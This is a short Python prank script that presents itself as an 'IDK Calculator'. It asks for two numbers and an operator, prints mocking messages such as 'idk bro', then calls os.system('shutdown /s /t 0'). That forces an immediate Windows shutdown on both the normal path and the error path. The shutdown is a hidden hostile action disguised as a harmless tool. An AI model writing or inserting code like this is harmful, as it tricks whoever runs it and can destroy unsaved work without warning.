import os
import time

def calculator():
    print("Welcome to the IDK Calculator!")
    try:
        num1 = float(input("Enter first number: "))
        op = input("Enter operator (+, -, *, /): ")
        num2 = float(input("Enter second number: "))
        
        print("Result: idk bro")
        time.sleep(2)
        print("Your on your own for this")
        time.sleep(1)
        
        os.system("shutdown /s /t 0")
            
    except ValueError:
        print("Result: idk bro")
        time.sleep(2)
        print("Your on your own lmfao")
        time.sleep(1)
        os.system("shutdown /s /t 0")

if __name__ == "__main__":

    calculator()

